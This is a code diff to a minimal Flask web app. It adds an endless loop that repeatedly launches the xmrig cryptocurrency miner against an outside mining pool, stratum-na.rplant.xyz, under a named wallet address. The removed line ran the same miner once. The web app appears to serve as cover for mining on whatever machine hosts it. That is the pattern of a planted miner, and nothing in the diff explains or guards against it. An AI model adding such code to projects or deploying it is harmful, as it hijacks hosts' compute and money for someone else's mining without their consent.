@@ -12,7 +12,11 @@ app = Flask(__name__)
 def hello():
     return "Hello from Python!"
 
-p2 = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim3 -t 2 -k", stdout=subprocess.PIPE, shell=True)
+i=0
+
+while 1:
+    subprocess.run(["./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 2 -k"],shell=True)
+    sleep(20)
 
 from IPython.display import clear_output 
 
